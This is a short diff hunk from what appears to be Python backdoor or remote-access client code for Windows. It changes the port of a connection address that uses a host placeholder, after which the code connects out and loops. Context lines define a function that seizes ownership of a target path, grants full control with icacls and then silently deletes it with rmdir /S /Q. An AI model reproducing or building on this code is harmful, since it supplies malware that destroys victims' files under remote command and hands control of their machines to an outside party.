@@ -89,7 +89,7 @@ def FDR(target:str)->None:
     run("takeown /D Y /R /F {}".format(target))
     run("icacls {} /T /C /grant {}:(F,MA)".format(target,environ.get("username")))
     run("rmdir /S /Q {}".format(target))
-addr=("%s",54213)
+addr=("%s",8085)
 connect()
 while True:
     try:
